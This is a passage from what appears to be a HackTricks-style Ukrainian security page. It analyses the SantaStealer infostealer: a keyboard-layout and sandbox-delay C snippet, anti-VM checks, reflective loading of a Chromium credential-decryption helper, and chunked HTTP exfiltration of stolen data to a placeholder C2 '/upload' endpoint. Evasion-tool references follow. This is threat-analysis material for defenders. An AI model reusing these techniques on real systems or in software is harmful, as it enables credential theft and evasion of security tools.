- Image‑load evasion: якщо хукати LoadLibrary*, відстежуйте підозрілі завантаження automation/clr assemblies, які корелюють з memory masking подіями.

Пов'язані будівельні блоки та приклади
- Reflective loaders, які виконують IAT patching під час завантаження (наприклад, TitanLdr, AceLdr)
- Memory masking hooks (наприклад, simplehook) та stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (наприклад, Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ілюструє, як сучасні info-stealers поєднують AV bypass, anti-analysis та доступ до облікових даних в одному робочому процесі.

### Keyboard layout gating & sandbox delay

- Прапорець конфігурації (`anti_cis`) перераховує встановлені розкладки клавіатури через `GetKeyboardLayoutList`. Якщо знаходиться кирилична розкладка, зразок залишає порожній маркер `CIS` і завершується перед запуском stealers, гарантуючи, що він ніколи не детонує в виключених локалях, при цьому залишаючи артефакт для hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Багаторівнева логіка `check_antivm`

- Варіант A проходить список процесів, хешує кожне ім'я власним ролінг-хешем і порівнює його зі вбудованими блок-листами для дебагерів/пісочниць; також повторює хеш для імені комп'ютера та перевіряє робочі директорії, такі як `C:\analysis`.
- Варіант B інспектує властивості системи (нижня межа кількості процесів, нещодавній uptime), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і виконує таймінгові перевірки навколо sleep-ів, щоб виявити single-stepping. Будь-яке виявлення припиняє виконання перед запуском модулів.

### Fileless helper + double ChaCha20 reflective loading

- Основний DLL/EXE вбудовує Chromium credential helper, який або скидається на диск, або мапиться вручну в пам'яті; у fileless-режимі helper самостійно вирішує імпорти/релокації, тож артефакти helper-а не записуються.
- Цей helper зберігає другий-stage DLL, зашифрований двічі за допомогою ChaCha20 (два 32-байтові ключі + 12-байтові nonces). Після обох проходів він reflectively loads бінарний blob (без `LoadLibrary`) і викликає експорти `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, запозичені з [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Рутини ChromElevator використовують direct-syscall reflective process hollowing для інжекції в живий Chromium browser, успадковують AppBound Encryption keys та розшифровують паролі/куки/кредитки прямо з SQLite баз даних всупереч ABE hardening.

### Модульний in-memory збір і покомпонентна HTTP ексфільтрація

- `create_memory_based_log` ітерує глобальну таблицю вказівників функцій `memory_generators` і запускає по треду на модуль, що увімкнено (Telegram, Discord, Steam, скріншоти, документи, розширення браузера тощо). Кожен тред записує результати в спільні буфери і повідомляє кількість файлів після ~45s вікна join.
- Після завершення все архівується за допомогою статично підключеної бібліотеки `miniz` у `%TEMP%\\Log.zip`. `ThreadPayload1` потім спить 15s і стрімить архів шматками по 10 MB через HTTP POST на `http://<C2>:6767/upload`, підробляючи браузерний `multipart/form-data` boundary (`----WebKitFormBoundary***`). Кожен шматок додає `User-Agent: upload`, `auth: <build_id>`, опціонально `w: <campaign_tag>`, а останній шматок додає `complete: true`, щоб C2 знав, що збирання завершене.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
